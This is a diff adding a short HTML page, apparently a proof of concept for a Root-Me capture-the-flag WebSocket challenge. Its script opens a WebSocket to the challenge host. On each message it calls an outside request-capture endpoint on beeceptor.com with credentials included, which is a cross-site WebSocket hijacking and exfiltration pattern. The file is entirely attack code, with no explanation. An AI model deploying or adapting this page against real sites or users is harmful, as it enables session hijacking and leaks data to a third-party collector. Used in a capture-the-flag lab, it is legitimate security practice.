@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebSocket root-me</title>
+</head>
+<body>
+    <script>
+        const socket = new WebSocket('ws://ctf17.root-me.org/ws'); // Remplace par ton URL WebSocket
+        socket.onmessage = (event) => {
+            fetch('https://keskispace.free.beeceptor.com', {
+                credentials: 'include' // Inclut les cookies dans la requête
+            });
+        };
+
+        socket.onerror = (error) => {
+            console.error('Erreur WebSocket:', error);
+        };
+    </script>
+</body>
+</html>
